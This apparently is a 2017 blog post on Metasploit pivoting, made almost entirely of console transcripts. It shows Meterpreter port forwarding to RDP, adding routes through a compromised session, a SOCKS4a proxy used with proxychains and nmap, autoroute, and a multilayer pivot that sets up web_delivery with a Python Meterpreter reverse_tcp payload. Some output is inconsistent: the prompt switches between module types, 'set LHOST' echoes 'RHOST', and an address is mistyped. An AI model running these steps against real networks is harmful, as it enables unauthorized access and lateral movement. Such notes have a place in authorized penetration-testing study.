---
title: Meterpreter Proxy and Route
date: 2017-01-02 00:49:27
tags: Meterpreter
---

### 0x01 portfwd

```
meterpreter > portfwd add -l 1234 -r 192.168.0.105 -p 3389
[*] Local TCP relay created: :1234 <-> 192.168.0.105:3389
meterpreter > portfwd

Active Port Forwards
====================

   Index  Local         Remote              Direction
   -----  -----         ------              ---------
   1      0.0.0.0:1234  192.168.0.105:3389  Forward

1 total active port forwards.
> rdesktop 127.1.1.0:1234
```
### 0x02 pivot

```
msf exploit(web_delivery) > route add 192.168.0.0 255.255.255.0 1
[*] Route added
msf exploit(web_delivery) > route

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.0.0        255.255.255.0      Session 1

msf exploit(web_delivery) > sessions

Active sessions
===============

  Id  Type                    Information              Connection
  --  ----                    -----------              ----------
  1   meterpreter python/osx  xl7dev  192.168.0.105:4444 -> 192.168.0.105:50834 (192.168.0.105)
msf exploit(web_delivery) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy
msf auxiliary(socks4a) > exploit -y
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server
> vi /etc/proxychains.conf
socks4  127.0.0.1 1080
> proxychains4 nmap -sT -Pn 192.168.0.100
```
### 0x03 autoroute
```
meterpreter > run autoroute -h
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module
meterpreter > run autoroute -s 192.168.0.1/24
[*] Adding a route to 192.168.0.1/255.255.255.0...
[+] Added route to 192.168.0.1/255.255.255.0 via 192.168.0.105
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
msf auxiliary(web_delivery) > use auxiliary/scanner/portscan/tcp
...
```
### 0x04 Multilayer Proxy

attacker->target1->target2

```
meterpreter > route add 192.168.0.105 255.255.255.0 1
[*] Route added
msf auxiliary(web_delivery) > route print
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.0.105      255.255.255.255    Session 1
msf auxiliary(web_delivery) > set LHOST 192.168.0.105
RHOST => 192.168.0.105
msf exploit(web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8089             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.68.0.105     yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python
msf auxiliary(web_delivery) > run
```